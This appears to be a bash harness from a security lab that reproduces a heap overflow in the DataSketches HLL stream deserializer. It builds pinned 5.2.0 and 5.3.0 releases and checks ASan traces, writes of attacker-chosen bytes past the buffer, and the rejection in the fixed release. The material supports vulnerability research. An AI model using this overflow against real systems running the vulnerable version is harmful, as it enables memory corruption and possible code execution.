#!/usr/bin/env bash
# Stream-overload counterpart of lab/frontier/datasketches2shell/run.sh.
# Verifies the same five pinned artifacts, compiles the pinned release headers
# verbatim and exercises the public hll_sketch::deserialize(std::istream&)
# path. No socket, no external probe, no library source patching.
set -uo pipefail
HERE=$(cd "$(dirname "$0")" && pwd)
OUT=${1:-"$HERE/out"}
mkdir -p "$OUT"
OUT=$(cd "$OUT" && pwd)
PINS="$HERE/../frontier/datasketches2shell/src"
(cd "$PINS" && sha256sum -c SHA256SUMS) > "$OUT/pins.log" || { echo "PINS FAILED"; exit 2; }

rm -rf "$OUT/v52" "$OUT/v53"
mkdir -p "$OUT/v52" "$OUT/v53"
tar -xzf "$PINS/5.2.0.tar.gz" -C "$OUT/v52" --strip-components=1 || exit 2
tar -xzf "$PINS/5.3.0.tar.gz" -C "$OUT/v53" --strip-components=1 || exit 2
I52="-I$OUT/v52/hll/include -I$OUT/v52/common/include"
I53="-I$OUT/v53/hll/include -I$OUT/v53/common/include"
export ASAN_OPTIONS=detect_leaks=0:abort_on_error=0
g++ -std=c++11 -O0 -g -fsanitize=address -fno-omit-frame-pointer $I52 "$HERE/stream_driver.cpp" -o "$OUT/v52_asan" || exit 2
g++ -std=c++11 -O0 -g $I52 "$HERE/stream_driver.cpp" -o "$OUT/v52_plain" || exit 2
g++ -std=c++11 -O0 -g -fsanitize=address -fno-omit-frame-pointer $I53 "$HERE/stream_driver.cpp" -o "$OUT/v53_asan" || exit 2

pass=0; fail=0
check() {
  if [ "$2" = 1 ]; then pass=$((pass+1)); echo "PASS: $1";
  else fail=$((fail+1)); echo "FAIL: $1"; fi
}
contains() { case "$2" in *"$1"*) return 0;; *) return 1;; esac; }

$OUT/v52_asan asan 64 90 > "$OUT/asan64.log" 2>&1
a=$(cat "$OUT/asan64.log"); echo "--- asan64 ---"; echo "$a"
ok=0
contains 'heap-buffer-overflow' "$a" &&
contains 'WRITE of size 256' "$a" &&
contains 'CouponList-internal.hpp:162' "$a" &&
contains 'HllSketchImplFactory.hpp:86' "$a" &&
contains 'HllSketch-internal.hpp:57' "$a" &&
contains '32-byte region' "$a" && ok=1
check "stream API: ASan WRITE at pinned CouponList-internal.hpp:162 via public deserialize" "$ok"

$OUT/v52_asan asan 255 119 > "$OUT/asan255.log" 2>&1
m=$(cat "$OUT/asan255.log")
check "stream API: max count writes 1020 bytes, 988 past the 32-byte region" \
  "$(contains 'WRITE of size 1020' "$m" && contains '32-byte region' "$m" && echo 1 || echo 0)"

r1=$($OUT/v52_plain readback 64 90); echo "$r1"
check "stream API: chosen 0x5a at +32/+48/+64/+96/+128/+224/+255" \
  "$(contains '+32=5a +48=5a +64=5a +96=5a +128=5a +224=5a +255=5a' "$r1" && echo 1 || echo 0)"
r2=$($OUT/v52_plain readback 64 165); echo "$r2"
check "stream API: chosen 0xa5, not a fixed marker" \
  "$(contains '+32=a5 +48=a5 +64=a5 +96=a5 +128=a5 +224=a5 +255=a5' "$r2" && echo 1 || echo 0)"

( $OUT/v52_plain guard 64 90 > "$OUT/guard.log" 2>&1 ); grc=$?
check "stream API: guard page faults at the first past-end store" "$([ "$grc" -eq 139 ] && echo 1 || echo 0)"

nc=$($OUT/v52_asan noncompact 64 90 2>&1); echo "$nc"
check "stream control: clearing compact flag bounds the read to 8 coupons, ASan clean" \
  "$(contains 'rv=ok' "$nc" && ! contains 'AddressSanitizer' "$nc" && echo 1 || echo 0)"

b=$($OUT/v52_asan bytes 64 90 2>&1); echo "--- byte path summary ---"; echo "$b" | grep -E 'ERROR|SUMMARY|#0 |#1 |bytes count' | head -8
check "byte path still faults at pinned :116, distinct from the stream :162 frame" \
  "$(contains 'CouponList-internal.hpp:116' "$b" && echo 1 || echo 0)"

f=$($OUT/v53_asan asan 64 90 2>&1); echo "$f"
check "fixed 5.3.0 rejects couponCount >= capacity before the stream read" \
  "$(contains 'couponCount >= capacity' "$f" && ! contains 'AddressSanitizer' "$f" && echo 1 || echo 0)"

fi=$($OUT/v52_asan asan 2 90 2>&1); echo "$fi"
check "vulnerable build accepts a count that fits, ASan clean" \
  "$(contains 'rv=ok' "$fi" && ! contains 'AddressSanitizer' "$fi" && echo 1 || echo 0)"

group() {
  for v in 90 165 119 90 165; do $OUT/v52_plain readback 64 "$v"; done | sha256sum | cut -d' ' -f1
}
h1=$(group); h2=$(group)
echo "sha256=$h1 sha256_b=$h2"
check "determinism: two 5-run groups identical" "$([ "$h1" = "$h2" ] && echo 1 || echo 0)"

echo "TOTAL PASS=$pass FAIL=$fail"
[ "$fail" -eq 0 ] && { echo "ALL CHECKS PASS rc 0"; exit 0; }
echo "SOME CHECKS FAILED rc 1"; exit 1
